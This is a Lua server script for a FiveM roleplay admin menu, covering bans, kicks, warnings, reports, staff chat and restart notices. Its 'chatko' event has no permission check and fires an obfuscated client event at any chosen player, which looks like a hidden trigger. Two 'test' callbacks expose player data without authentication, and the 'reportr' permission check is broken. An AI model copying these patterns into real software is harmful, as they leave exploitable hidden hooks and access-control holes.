-- Variables
local AJFW = exports['aj-base']:GetCoreObject()
local frozen = false
local permissions = {
    ['kill'] = 'admin',
    ['ban'] = 'admin',
    ['noclip'] = 'admin',
    ['kickall'] = 'admin',
    ['kick'] = 'admin',
    ['revive'] = 'admin',
    ['freeze'] = 'admin',
    ['goto'] = 'admin',
    ['spectate'] = 'admin',
    ['intovehicle'] = 'admin',
    ['bring'] = 'admin',
    ['inventory'] = 'admin',
    ['clothing'] = 'admin'
}
local players = {}

-- Get Dealers
AJFW.Functions.CreateCallback('test:getdealers', function(_, cb)
    cb(exports['aj-drugs']:GetDealers())
end)

-- Get Players
AJFW.Functions.CreateCallback('test:getplayers', function(_, cb) -- WORKS
    cb(players)
end)

AJFW.Functions.CreateCallback('aj-admin:server:getrank', function(source, cb)
    if AJFW.Functions.HasPermission(source, 'god') or IsPlayerAceAllowed(source, 'command') then
        cb(true)
    else
        cb(false)
    end
end)

-- Functions
local function tablelength(table)
    local count = 0
    for _ in pairs(table) do
        count = count + 1
    end
    return count
end

local function BanPlayer(src)
    MySQL.insert('INSERT INTO bans (name, license, discord, ip, reason, expire, bannedby) VALUES (?, ?, ?, ?, ?, ?, ?)', {
        GetPlayerName(src),
        AJFW.Functions.GetIdentifier(src, 'license'),
        AJFW.Functions.GetIdentifier(src, 'discord'),
        AJFW.Functions.GetIdentifier(src, 'ip'),
        'Trying to revive theirselves or other players',
        2147483647,
        'aj-adminmenu'
    })
    TriggerEvent('aj-log:server:CreateLog', 'adminmenu', 'Player Banned', 'red', string.format('%s was banned by %s for %s', GetPlayerName(src), 'aj-adminmenu', 'Trying to trigger admin options which they dont have permission for'), true)
    DropPlayer(src, 'You were permanently banned by the server for: Exploiting')
end

-- Events
RegisterNetEvent('aj-admin:server:GetPlayersForBlips', function()
    local src = source
    TriggerClientEvent('aj-admin:client:Show', src, players)
end)

RegisterNetEvent('aj-admin:server:kill', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, permissions['kill']) or IsPlayerAceAllowed(src, 'command') then
        TriggerClientEvent('hospital:client:KillPlayer', player.id)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:revive', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, permissions['revive']) or IsPlayerAceAllowed(src, 'command') then
        TriggerClientEvent('hospital:client:Revive', player.id)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:kick', function(player, reason)
    local src = source
    if AJFW.Functions.HasPermission(src, permissions['kick']) or IsPlayerAceAllowed(src, 'command') then
        TriggerEvent('aj-log:server:CreateLog', 'bans', 'Player Kicked', 'red', string.format('%s was kicked by %s for %s', GetPlayerName(player.id), GetPlayerName(src), reason), true)
        DropPlayer(player.id, Lang:t('info.kicked_server') .. ':\n' .. reason .. '\n\n' .. Lang:t('info.check_discord') .. AJFW.Config.Server.Discord)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:ban', function(player, time, reason)
    local src = source
    if AJFW.Functions.HasPermission(src, permissions['ban']) or IsPlayerAceAllowed(src, 'command') then
        time = tonumber(time)
        local banTime = tonumber(os.time() + time)
        if banTime > 2147483647 then
            banTime = 2147483647
        end
        local timeTable = os.date('*t', banTime)
        MySQL.insert('INSERT INTO bans (name, license, discord, ip, reason, expire, bannedby) VALUES (?, ?, ?, ?, ?, ?, ?)', {
            GetPlayerName(player.id),
            AJFW.Functions.GetIdentifier(player.id, 'license'),
            AJFW.Functions.GetIdentifier(player.id, 'discord'),
            AJFW.Functions.GetIdentifier(player.id, 'ip'),
            reason,
            banTime,
            GetPlayerName(src)
        })
        TriggerClientEvent('chat:addMessage', -1, {
            template = "<div class=chat-message server'><strong>ANNOUNCEMENT | {0} has been banned:</strong> {1}</div>",
            args = { GetPlayerName(player.id), reason }
        })
        TriggerEvent('aj-log:server:CreateLog', 'bans', 'Player Banned', 'red', string.format('%s was banned by %s for %s', GetPlayerName(player.id), GetPlayerName(src), reason), true)
        if banTime >= 2147483647 then
            DropPlayer(player.id, Lang:t('info.banned') .. '\n' .. reason .. Lang:t('info.ban_perm') .. AJFW.Config.Server.Discord)
        else
            DropPlayer(player.id, Lang:t('info.banned') .. '\n' .. reason .. Lang:t('info.ban_expires') .. timeTable['day'] .. '/' .. timeTable['month'] .. '/' .. timeTable['year'] .. ' ' .. timeTable['hour'] .. ':' .. timeTable['min'] .. '\n🔸 Check our Discord for more information: ' .. AJFW.Config.Server.Discord)
        end
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:spectate', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, permissions['spectate']) or IsPlayerAceAllowed(src, 'command') then
        local targetped = GetPlayerPed(player.id)
        local coords = GetEntityCoords(targetped)
        TriggerClientEvent('aj-admin:client:spectate', src, player.id, coords)
    else
        BanPlayer(src)
    end
end)

-- RegisterNetEvent('aj-admin:server:freeze', function(player)
--     local src = source
--     if AJFW.Functions.HasPermission(src, permissions['freeze']) or IsPlayerAceAllowed(src, 'command') then
--         local target = GetPlayerPed(player.id)
--         if not frozen then
--             frozen = true
--             FreezeEntityPosition(target, true)
--         else
--             frozen = false
--             FreezeEntityPosition(target, false)
--         end
--     else
--         BanPlayer(src)
--     end
-- end)

-- RegisterNetEvent('aj-admin:server:goto', function(player)
--     local src = source
--     if AJFW.Functions.HasPermission(src, permissions['goto']) or IsPlayerAceAllowed(src, 'command') then
--         local admin = GetPlayerPed(src)
--         local coords = GetEntityCoords(GetPlayerPed(player.id))
--         SetEntityCoords(admin, coords)
--     else
--         BanPlayer(src)
--     end
-- end)

-- RegisterNetEvent('aj-admin:server:intovehicle', function(player)
--     local src = source
--     if AJFW.Functions.HasPermission(src, permissions['intovehicle']) or IsPlayerAceAllowed(src, 'command') then
--         local admin = GetPlayerPed(src)
--         local targetPed = GetPlayerPed(player.id)
--         local vehicle = GetVehiclePedIsIn(targetPed, false)
--         local seat = -1
--         if vehicle ~= 0 then
--             for i = 0, 8, 1 do
--                 if GetPedInVehicleSeat(vehicle, i) == 0 then
--                     seat = i
--                     break
--                 end
--             end
--             if seat ~= -1 then
--                 SetPedIntoVehicle(admin, vehicle, seat)
--                 TriggerClientEvent('AJFW:Notify', src, Lang:t('sucess.entered_vehicle'), 'success', 5000)
--             else
--                 TriggerClientEvent('AJFW:Notify', src, Lang:t('error.no_free_seats'), 'danger', 5000)
--             end
--         end
--     else
--         BanPlayer(src)
--     end
-- end)


RegisterNetEvent('aj-admin:server:bring', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'c-admin') or AJFW.Functions.HasPermission(src, 'admin') or AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        local admin = GetPlayerPed(src)
        local coords = GetEntityCoords(admin)
        local target = GetPlayerPed(player.id)
        SetEntityCoords(target, coords)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:inventory', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, 'admin') or AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        TriggerClientEvent('aj-admin:client:inventory', src, player.id)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:cloth', function(player)
    local src = source
    if AJFW.Functions.HasPermission(src, 'admin') or AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        TriggerClientEvent('aj-clothing:client:openMenu', player.id)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:setPermissions', function(targetId, group)
    local src = source
    if AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        AJFW.Functions.AddPermission(targetId, group[1].rank)
        TriggerClientEvent('AJFW:Notify', targetId, Lang:t('info.rank_level') .. group[1].label)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:SendReport', function(name, targetSrc, msg)
    local src = source
    if AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'c-admin') or AJFW.Functions.HasPermission(src, 'admin') or AJFW.Functions.HasPermission(src, 's-mod') or AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command')  or IsPlayerAceAllowed(src, 'command') then
        if AJFW.Functions.IsOptin(src) then
            TriggerClientEvent('chat:addMessage', src, {
                color = { 255, 0, 0 },
                multiline = true,
                args = { Lang:t('info.admin_report') .. name .. ' (' .. targetSrc .. ')', msg }
            })
        end
    end
end)

RegisterServerEvent('aj-admin:giveWeapon', function(weapon)
    local src = source
    if AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        local Player = AJFW.Functions.GetPlayer(src)
        Player.Functions.AddItem(weapon, 1)
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent('aj-admin:server:SaveCar', function(mods, vehicle, _, plate)
    local src = source
    if AJFW.Functions.HasPermission(src, 'dev') or AJFW.Functions.HasPermission(src, 'manager') or IsPlayerAceAllowed(src, 'command') then
        local Player = AJFW.Functions.GetPlayer(src)
        local result = MySQL.query.await('SELECT plate FROM player_vehicles WHERE plate = ?', { plate })
        if result[1] == nil then
            MySQL.insert('INSERT INTO player_vehicles (license, citizenid, vehicle, hash, mods, plate, state) VALUES (?, ?, ?, ?, ?, ?, ?)', {
                Player.PlayerData.license,
                Player.PlayerData.citizenid,
                vehicle.model,
                vehicle.hash,
                json.encode(mods),
                plate,
                0
            })
            TriggerClientEvent('AJFW:Notify', src, Lang:t('success.success_vehicle_owner'), 'success', 5000)
        else
            TriggerClientEvent('AJFW:Notify', src, Lang:t('error.failed_vehicle_owner'), 'error', 3000)
        end
    else
        BanPlayer(src)
    end
end)

RegisterNetEvent("aj-admin:server:chatko")
RegisterNetEvent("aj-admin:server:chatko", function(player)
    TriggerClientEvent('0101011100111001011110011010111010001010101010101001110001001000101010100010001101001010010010101010010010101010100100101000101000101001010100101010101010011011111101001010100010110101010101:15CE5E6BA2AAA7122A88D292A92AA4A28A54AAA6FD2A2D55:534684708704325086204787636882478626716935644080530664789', player.id)
end)

AJFW.Functions.CreateCallback('aj-admin:server:getrank', function(source, cb)
    local src = source
    if AJFW.Functions.HasPermission(src, 'admin') and AJFW.Functions.HasPermission(src, 'h-admin') or AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'owner') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
        cb(AJFW.Functions.GetPermission(src))
    else
        cb(nil)
    end
end)


AddEventHandler('txAdmin:events:scheduledRestart', function(eventData) -- Gets called every [30, 15, 10, 5, 4, 3, 2, 1] minutes by default according to config
    if eventData.secondsRemaining == 1800 then -- 30mins
        -- TriggerEvent('aj-weathersync:server:setWeather2', "thunder")
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 30 minutes!" }
        })
    elseif eventData.secondsRemaining == 900 then -- 15mins
        TriggerEvent('aj-weathersync:server:setWeather2', "rain")
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 15 minutes!" }
        })
    elseif eventData.secondsRemaining == 300 then -- 5mins
        TriggerEvent('aj-weathersync:server:setWeather2', "thunder")
        TriggerEvent('aj-weathersync:server:tsunami:blackout')
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 5 minutes!" }
        })
    elseif eventData.secondsRemaining == 120 then -- 2mins
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 2 minutes!" }
        })
    elseif eventData.secondsRemaining == 60 then -- 1min
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 1 minutes!" }
        })
        Citizen.Wait(30000) -- Because this event does not get called at the 30second mark
        TriggerClientEvent('chat:addMessage', -1, {
            template = '<div class="restart"><i class="fa fa-bullhorn"></i> {0}<br>^0{1}</div>',
            args = { "Emergency Announcement!", "Attention citizens! 🌊 Tsunami is going to hit the city in 30 Seconds!" }
        })
    end
end)


-- Commands

AJFW.Commands.Add("cls", "Clear all chat", {} , false, function(source, args)
	local src = source
    local Players = AJFW.Functions.GetPlayers()
	TriggerClientEvent('chat:clear', -1)
	TriggerClientEvent('AJFW:Notify', src, 'Chat Cleared Sucessfully', 'success', 3000)
end, 'c-admin')

AJFW.Commands.Add('maxmods', Lang:t('desc.max_mod_desc'), {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:maxmodVehicle', src)
end, 'manager')

AJFW.Commands.Add('blips', Lang:t('commands.blips_for_player'), {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:toggleBlips', src)
end, 'c-admin')

AJFW.Commands.Add('names', Lang:t('commands.player_name_overhead'), {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:toggleNames', src)
end, 'c-admin')

AJFW.Commands.Add('coords', Lang:t('commands.coords_dev_command'), {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:ToggleCoords', src)
end, 'h-admin')

AJFW.Commands.Add('noclip', Lang:t('commands.toogle_noclip'), {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:ToggleNoClip', src)
end, 'admin')

AJFW.Commands.Add('admincar', Lang:t('commands.save_vehicle_garage'), {}, false, function(source, _)
    TriggerClientEvent('aj-admin:client:SaveCar', source)
end, 'manager')

AJFW.Commands.Add('announce', Lang:t('commands.make_announcement'), {}, false, function(_, args)
    local msg = table.concat(args, ' ')
    if msg == '' then return end
    TriggerClientEvent('chat:addMessage', -1, {
        color = { 255, 0, 0 },
        multiline = true,
        args = { 'Announcement', msg }
    })
end, 'admin')

AJFW.Commands.Add('admin', Lang:t('commands.open_admin'), {}, false, function(source, _)
    TriggerClientEvent('aj-admin:client:openMenu', source)
end, 'admin')

AJFW.Commands.Add('report', Lang:t('info.admin_report'), { { name = 'message', help = 'Message' } }, true, function(source, args)
    local src = source
    local msg = table.concat(args, ' ')
    local Player = AJFW.Functions.GetPlayer(source)
    TriggerClientEvent('aj-admin:client:SendReport', -1, GetPlayerName(src), src, msg)
    TriggerEvent('aj-log:server:CreateLog', 'report', 'Report', 'green', '**' .. GetPlayerName(source) .. '** (CitizenID: ' .. Player.PlayerData.citizenid .. ' | ID: ' .. source .. ') **Report:** ' .. msg, false)
end)

AJFW.Commands.Add('smsg', Lang:t('commands.staffchat_message'), { { name = 'message', help = 'Message' } }, true, function(source, args)
    local msg = table.concat(args, ' ')
    local name = GetPlayerName(source)

    local plrs = AJFW.Functions.GetPlayers()

    for i = 1, #plrs, 1 do
        local plr = plrs[i]
        if AJFW.Functions.HasPermission(plr, 's-mod') or AJFW.Functions.HasPermission(plr, 'mod') or
        AJFW.Functions.HasPermission(plr, 'admin') or AJFW.Functions.HasPermission(plr, 'c-admin') or 
        AJFW.Functions.HasPermission(plr, 'h-admin') or AJFW.Functions.HasPermission(plr, 'manager') or
        AJFW.Functions.HasPermission(plr, 'owner') or AJFW.Functions.HasPermission(plr, 'dev') or IsPlayerAceAllowed(plr, 'command') then
            if AJFW.Functions.IsOptin(plr) then
                TriggerClientEvent('chat:addMessage', plr, {
                    color = { 255, 0, 0 },
                    multiline = true,
                    args = { Lang:t('info.staffchat') .. name, msg }
                })
            end
        end
    end
end, 'mod')

AJFW.Commands.Add('gmsg', Lang:t('commands.staffchat_message'), { { name = 'message', help = 'Message' } }, true, function(source, args)
    local msg = table.concat(args, ' ')
    local name = GetPlayerName(source)

    local plrs = AJFW.Functions.GetPlayers()

    for i = 1, #plrs, 1 do
        local plr = plrs[i]
        if AJFW.Functions.HasPermission(plr, 'h-admin') or AJFW.Functions.HasPermission(plr, 'manager') or
        AJFW.Functions.HasPermission(plr, 'owner') or AJFW.Functions.HasPermission(plr, 'dev') or IsPlayerAceAllowed(plr, 'command') then
            if AJFW.Functions.IsOptin(plr) then
                TriggerClientEvent('chat:addMessage', plr, {
                    color = { 255, 0, 0 },
                    multiline = true,
                    args = { Lang:t('info.staffchat') .. name, msg }
                })
            end
        end
    end
end, 'mod')

AJFW.Commands.Add('givenuifocus', Lang:t('commands.nui_focus'), { { name = 'id', help = 'Player id' }, { name = 'focus', help = 'Set focus on/off' }, { name = 'mouse', help = 'Set mouse on/off' } }, true, function(_, args)
    local playerid = tonumber(args[1])
    local focus = args[2]
    local mouse = args[3]
    TriggerClientEvent('aj-admin:client:GiveNuiFocus', playerid, focus, mouse)
end, 'h-admin')

AJFW.Commands.Add('warn', Lang:t('commands.warn_a_player'), { { name = 'ID', help = 'Player' }, { name = 'Reason', help = 'Mention a reason' } }, true, function(source, args)
    local targetPlayer = AJFW.Functions.GetPlayer(tonumber(args[1]))
    local senderPlayer = AJFW.Functions.GetPlayer(source)
    table.remove(args, 1)
    local msg = table.concat(args, ' ')
    local warnId = 'WARN-' .. math.random(1111, 9999)
    if targetPlayer ~= nil then
        TriggerClientEvent('chat:addMessage', targetPlayer.PlayerData.source, { args = { 'SYSTEM', Lang:t('info.warning_chat_message') .. GetPlayerName(source) .. ',' .. Lang:t('info.reason') .. ': ' .. msg }, color = 255, 0, 0 })
        TriggerClientEvent('chat:addMessage', source, { args = { 'SYSTEM', Lang:t('info.warning_staff_message') .. GetPlayerName(targetPlayer.PlayerData.source) .. ', for: ' .. msg }, color = 255, 0, 0 })
        MySQL.insert('INSERT INTO player_warns (senderIdentifier, targetIdentifier, reason, warnId) VALUES (?, ?, ?, ?)', {
            senderPlayer.PlayerData.license,
            targetPlayer.PlayerData.license,
            msg,
            warnId
        })
    else
        TriggerClientEvent('AJFW:Notify', source, Lang:t('error.not_online'), 'error')
    end
end, 'admin')

AJFW.Commands.Add('checkwarns', Lang:t('commands.check_player_warning'), { { name = 'id', help = 'Player' }, { name = 'Warning', help = 'Number of warning, (1, 2 or 3 etc..)' } }, false, function(source, args)
    if args[2] == nil then
        local targetPlayer = AJFW.Functions.GetPlayer(tonumber(args[1]))
        local result = MySQL.query.await('SELECT * FROM player_warns WHERE targetIdentifier = ?', { targetPlayer.PlayerData.license })
        TriggerClientEvent('chat:addMessage', source, 'SYSTEM', 'warning', targetPlayer.PlayerData.name .. ' has ' .. tablelength(result) .. ' warnings!')
    else
        local targetPlayer = AJFW.Functions.GetPlayer(tonumber(args[1]))
        local warnings = MySQL.query.await('SELECT * FROM player_warns WHERE targetIdentifier = ?', { targetPlayer.PlayerData.license })
        local selectedWarning = tonumber(args[2])
        if warnings[selectedWarning] ~= nil then
            local sender = AJFW.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)
            TriggerClientEvent('chat:addMessage', source, 'SYSTEM', 'warning', targetPlayer.PlayerData.name .. ' has been warned by ' .. sender.PlayerData.name .. ', Reason: ' .. warnings[selectedWarning].reason)
        end
    end
end, 'admin')

AJFW.Commands.Add('delwarn', Lang:t('commands.delete_player_warning'), { { name = 'id', help = 'Player' }, { name = 'Warning', help = 'Number of warning, (1, 2 or 3 etc..)' } }, true, function(source, args)
    local targetPlayer = AJFW.Functions.GetPlayer(tonumber(args[1]))
    local warnings = MySQL.query.await('SELECT * FROM player_warns WHERE targetIdentifier = ?', { targetPlayer.PlayerData.license })
    local selectedWarning = tonumber(args[2])
    if warnings[selectedWarning] ~= nil then
        TriggerClientEvent('chat:addMessage', source, 'SYSTEM', 'warning', 'You have deleted warning (' .. selectedWarning .. ') , Reason: ' .. warnings[selectedWarning].reason)
        MySQL.query('DELETE FROM player_warns WHERE warnId = ?', { warnings[selectedWarning].warnId })
    end
end, 'manager')

AJFW.Commands.Add('reportr', Lang:t('commands.reply_to_report'), { { name = 'id', help = 'Player' }, { name = 'message', help = 'Message to respond with' } }, false, function(source, args)
    local src = source
    local playerId = tonumber(args[1])
    table.remove(args, 1)
    local msg = table.concat(args, ' ')
    local OtherPlayer = AJFW.Functions.GetPlayer(playerId)
    if msg == '' then return end
    if not OtherPlayer then return TriggerClientEvent('AJFW:Notify', src, 'Player is not online', 'error') end
    if not AJFW.Functions.HasPermission(plr, 's-mod') or AJFW.Functions.HasPermission(plr, 'mod') or
    AJFW.Functions.HasPermission(plr, 'admin') or AJFW.Functions.HasPermission(plr, 'c-admin') or 
    AJFW.Functions.HasPermission(plr, 'h-admin') or AJFW.Functions.HasPermission(plr, 'manager') or
    AJFW.Functions.HasPermission(plr, 'owner') or AJFW.Functions.HasPermission(plr, 'dev')or IsPlayerAceAllowed(src, 'command') ~= 1 then return end
    TriggerClientEvent('chat:addMessage', playerId, {
        color = { 255, 0, 0 },
        multiline = true,
        args = { 'Admin Response', msg }
    })
    TriggerClientEvent('chat:addMessage', src, {
        color = { 255, 0, 0 },
        multiline = true,
        args = { 'Report Response (' .. playerId .. ')', msg }
    })
    TriggerClientEvent('AJFW:Notify', src, 'Reply Sent')
    TriggerEvent('aj-log:server:CreateLog', 'report', 'Report Reply', 'red', '**' .. GetPlayerName(src) .. '** replied on: **' .. OtherPlayer.PlayerData.name .. ' **(ID: ' .. OtherPlayer.PlayerData.source .. ') **Message:** ' .. msg, false)
end, 'mod')

AJFW.Commands.Add('setmodel', Lang:t('commands.change_ped_model'), { { name = 'model', help = 'Name of the model' }, { name = 'id', help = 'Id of the Player (empty for yourself)' } }, false, function(source, args)
    local model = args[1]
    local target = tonumber(args[2])
    if model ~= nil or model ~= '' then
        if target == nil then
            TriggerClientEvent('aj-admin:client:SetModel', source, tostring(model))
        else
            local Trgt = AJFW.Functions.GetPlayer(target)
            if Trgt ~= nil then
                TriggerClientEvent('aj-admin:client:SetModel', target, tostring(model))
            else
                TriggerClientEvent('AJFW:Notify', source, Lang:t('error.not_online'), 'error')
            end
        end
    else
        TriggerClientEvent('AJFW:Notify', source, Lang:t('error.failed_set_model'), 'error')
    end
end, 'manager')

AJFW.Commands.Add('setspeed', Lang:t('commands.set_player_foot_speed'), {}, false, function(source, args)
    local speed = args[1]
    if speed ~= nil then
        TriggerClientEvent('aj-admin:client:SetSpeed', source, tostring(speed))
    else
        TriggerClientEvent('AJFW:Notify', source, Lang:t('error.failed_set_speed'), 'error')
    end
end, 'manager')

AJFW.Commands.Add('reporttoggle', Lang:t('commands.report_toggle'), {}, false, function(source, _)
    local src = source
    AJFW.Functions.ToggleOptin(src)
    if AJFW.Functions.IsOptin(src) then
        TriggerClientEvent('AJFW:Notify', src, Lang:t('success.receive_reports'), 'success')
    else
        TriggerClientEvent('AJFW:Notify', src, Lang:t('error.no_receive_report'), 'error')
    end
end, 'mod')

AJFW.Commands.Add('kickall', Lang:t('commands.kick_all'), {}, false, function(source, args)
    local src = source
    if src > 0 then
        local reason = table.concat(args, ' ')
        if AJFW.Functions.HasPermission(src, 'manager') or AJFW.Functions.HasPermission(src, 'dev') or IsPlayerAceAllowed(src, 'command') then
            if reason and reason ~= '' then
                for _, v in pairs(AJFW.Functions.GetPlayers()) do
                    local Player = AJFW.Functions.GetPlayer(v)
                    if Player then
                        DropPlayer(Player.PlayerData.source, reason)
                    end
                end
            else
                TriggerClientEvent('AJFW:Notify', src, Lang:t('info.no_reason_specified'), 'error')
            end
        end
    else
        for _, v in pairs(AJFW.Functions.GetPlayers()) do
            local Player = AJFW.Functions.GetPlayer(v)
            if Player then
                DropPlayer(Player.PlayerData.source, Lang:t('info.server_restart') .. AJFW.Config.Server.Discord)
            end
        end
    end
end, 'manager')

AJFW.Commands.Add('setammo', Lang:t('commands.ammo_amount_set'), { { name = 'amount', help = 'Amount of bullets, for example: 20' } }, false, function(source, args)
    local src = source
    local ped = GetPlayerPed(src)
    local amount = tonumber(args[1])
    local weapon = GetSelectedPedWeapon(ped)
    if weapon and amount then
        SetPedAmmo(ped, weapon, amount)
        TriggerClientEvent('AJFW:Notify', src, Lang:t('info.ammoforthe', { value = amount, weapon = AJFW.Shared.Weapons[weapon]['label'] }), 'success')
    end
end, 'h-admin')

AJFW.Commands.Add('vector2', 'Copy vector2 to clipboard (Admin only)', {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:copyToClipboard', src, 'coords2')
end, 'admin')

AJFW.Commands.Add('vector3', 'Copy vector3 to clipboard (Admin only)', {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:copyToClipboard', src, 'coords3')
end, 'h-admin')

AJFW.Commands.Add('vector4', 'Copy vector4 to clipboard (Admin only)', {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:copyToClipboard', src, 'coords4')
end, 'h-admin')

AJFW.Commands.Add('heading', 'Copy heading to clipboard (Admin only)', {}, false, function(source)
    local src = source
    TriggerClientEvent('aj-admin:client:copyToClipboard', src, 'heading')
end, 'h-admin')

CreateThread(function()
    while true do
        local tempPlayers = {}
        for _, v in pairs(AJFW.Functions.GetPlayers()) do
            local targetped = GetPlayerPed(v)
            local ped = AJFW.Functions.GetPlayer(v)
            local firstname
            local lastname
            local citizenid
            local sourcesss
            local isAdmin
            local job
            local onduty
            if ped ~= nil then
                if ped.PlayerData ~= nil then
                    if ped.PlayerData.charinfo ~= nil then
                        if ped.PlayerData.charinfo.firstname ~= nil then
                            firstname = ped.PlayerData.charinfo.firstname
                        else
                            firstname = ' Null '
                        end
                        if ped.PlayerData.charinfo.lastname ~= nil then
                            lastname = ped.PlayerData.charinfo.lastname
                        else
                            lastname = ' Null '
                        end
                    else
                        firstname = ' Null '
                        lastname = ' Null '
                    end
                    if ped.PlayerData.citizenid ~= nil then
                        citizenid = ped.PlayerData.citizenid
                    else
                        citizenid = ' Null '
                    end
                    if ped.PlayerData.source ~= nil then
                        if AJFW.Functions.GetPermission(ped.PlayerData.source) ~= nil then
                            isAdmin = AJFW.Functions.GetPermission(ped.PlayerData.source)
                        else
                            isAdmin = ' user '
                        end
                        sourcesss = ped.PlayerData.source
                    else
                        sourcesss = ' Null '
                        isAdmin = ' user '
                    end
                    if ped.PlayerData.job  ~= nil then
                        if ped.PlayerData.job.name ~= nil then
                            job = ped.PlayerData.job.name
                        else
                            job = ' Null '
                        end
                    else
                        job = ' Null '
                    end
                    if ped.PlayerData.job  ~= nil then
                        if ped.PlayerData.job.onduty ~= nil then
                            onduty = ped.PlayerData.job.onduty
                        else
                            onduty = ' Null '
                        end
                    else
                        onduty = ' Null '
                    end
                else
                    firstname = ' Null '
                    lastname = ' Null '
                    citizenid = ' Null '
                    citizenid = ' Null '
                    job = ' Null '
                    onduty = ' Null '
                    isAdmin = ' user '
                end
            else
                firstname = ' Null '
                lastname = ' Null '
                citizenid = ' Null '
                citizenid = ' Null '
                job = ' Null '
                onduty = ' Null '
                isAdmin = ' user '
            end
            tempPlayers[#tempPlayers + 1] = {
                name = firstname .. ' ' .. lastname .. ' | ' .. GetPlayerName(v),
                id = v,
                coords = GetEntityCoords(targetped),
                cid = firstname .. ' ' .. lastname,
                citizenid = citizenid,
                sources = GetPlayerPed(sourcesss),
                sourceplayer= sourcesss,
                admin = isAdmin,
                job = job,
                duty = onduty,
            }
        end
        -- Sort players list by source ID (1,2,3,4,5, etc) --
        table.sort(tempPlayers, function(a, b)
            return a.id < b.id
        end)
        players = tempPlayers
        Wait(1500)
    end
end)
